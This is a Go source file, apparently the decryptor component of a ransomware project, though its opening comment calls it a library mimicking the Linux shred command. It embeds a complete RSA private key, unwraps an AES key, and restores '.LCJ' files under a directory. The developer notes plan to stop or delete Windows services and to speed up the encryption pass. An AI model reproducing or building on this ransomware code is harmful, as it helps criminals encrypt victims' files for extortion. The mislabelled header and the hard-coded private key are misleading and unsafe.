// Package shred is a golang library to mimic the functionality of the linux shred command
package main

// lisandro : delete all prints
// lisandro : sc delete|stop <service> (in cmd, delete|stop the service)

// lisandro : change the encryption swipe time from 3 to 2 ? (1?)

// encrypt the key file with RSA public key after creating the key file
// change the key var by another random string at the end of the program
import (
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"time"
)

var MB150 int = 157286400
var key []byte

// ========= GENERAL =========
func Error(err error) (error){
	if err != nil{
		return err
	}
	return nil
}
// ========= END GENERAL =========

func overwriteFile(path string, random bool) error {
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return err
	}

	defer f.Close()

	info, err := f.Stat()
	Error(err)

	buff := make([]byte, info.Size())
	if random {
		if _, err := rand.Read(buff); err != nil {
			return err
		}
	}

	_, err = f.WriteAt(buff, 0)
	return err
}
// ========= ENCRYPT =========

/////////////////////

func ParseRsaPrivateKeyFromPemStr(privPEM string) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode([]byte(privPEM))
	if block == nil {
		return nil, errors.New("failed to parse PEM block containing the key")
	}

	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	return priv, nil
}

func import_private_key() *rsa.PrivateKey{
	//Create the keys
	//priv, pub := GenerateRsaKeyPair()
	// Export the keys to pem string
	var priv_pem string
	priv_pem =
`-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
`

	// Import the keys from pem string
	priv_parsed, _ := ParseRsaPrivateKeyFromPemStr(priv_pem)

	// Export the newly imported keys
	//priv_parsed_pem := ExportRsaPrivateKeyAsPemStr(priv_parsed)

	return priv_parsed
}

func decrypt_encryption_key() []byte {
	content, err := ioutil.ReadFile("key")

	if err != nil {
		log.Fatal(err)
	}

	//fmt.Println(string(content))

	private_key := import_private_key()
	decrypted_bytes, err := private_key.Decrypt(
		nil,
		content,
		&rsa.OAEPOptions{Hash: crypto.SHA256})

	if err != nil {
		panic(err)
	}
	return decrypted_bytes
}

func check_key()() {
	_, err := ioutil.ReadFile("key") //Check to see if a key was already created
	if err != nil {
		pass() //If not, create one
	} else {
		key = decrypt_encryption_key() //If so, set key as the key found in the file
	}
}

/////////////////////

func decryptFile(inputfile string, outputfile string) {
	z, err := ioutil.ReadFile(inputfile)
	result := decrypt(key, z)
	err = ioutil.WriteFile(outputfile, result, 0755)
	if err != nil { //19111999 : we don't want this
		fmt.Printf("Unable to create decrypted file!\n")
		os.Exit(0)
	}
}

func decodeBase64(b, unecrypted_text []byte, above_150MB bool) []byte {
	data, err := base64.StdEncoding.DecodeString(string(b))
	if err != nil {
		fmt.Printf("Error: Bad Key!\n")
		os.Exit(0)
	}
	if above_150MB {
		return append(data, unecrypted_text...)
	}
	return data
}

func decrypt(key, text []byte) []byte {

	block, err := aes.NewCipher(key)
	Error(err)

	var above_150MB = false
	var not_ciphered_text, ciphered_text, iv []byte

	if len(text) > MB150 {
		ciphered_text	  = text[:10485760]
		not_ciphered_text = text[10485760:]
		above_150MB = true
	}

	if len(text) < aes.BlockSize { // lisandro : try with blank file
		fmt.Printf("Error!\n")
		os.Exit(0)
	}

	if above_150MB {
		iv 	 = ciphered_text[:aes.BlockSize]
		text = ciphered_text[aes.BlockSize:]
	} else {
		iv 	 = text[:aes.BlockSize]
		text = text[aes.BlockSize:]
	}

	cfb := cipher.NewCFBDecrypter(block, iv)
	cfb.XORKeyStream(text, text)
	if above_150MB { return decodeBase64(text, not_ciphered_text, above_150MB)}
	return decodeBase64(text, nil, false)
}

// ========= END ENCRYPT =========

func listdir(path string)([]string){
	searchDir := path
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return err
	})

	if e != nil {
		panic(e)
	}
	return fileList;
}

func is_dir(path string)(bool){
	name := path
	fi, err := os.Stat(name)
	if err != nil {
		return false
	}
	switch mode := fi.Mode(); {
	case mode.IsDir():
		return true
	case mode.IsRegular():
		return false
	}
	return false
}

func pass()(){
	_ = ""
}

func tree(path string)(){
	file_list := listdir(path)

	start := time.Now()
	for _, file := range file_list {
		if is_dir(file){
			continue
		}
		if file[len(file)-4:] != ".LCJ"{
			continue
		}

		decryptFile(file, file[:len(file)-4])
		err := os.Remove(file)
		if err!=nil {
			continue
		}
	}
	elapsed := time.Since(start)
	fmt.Println("All of your files has been decrypted")
	log.Printf("SECOND ELAPSED : %s", elapsed)
}

func main() {
	check_key()
	path := "/root/y"
	tree(path)
}











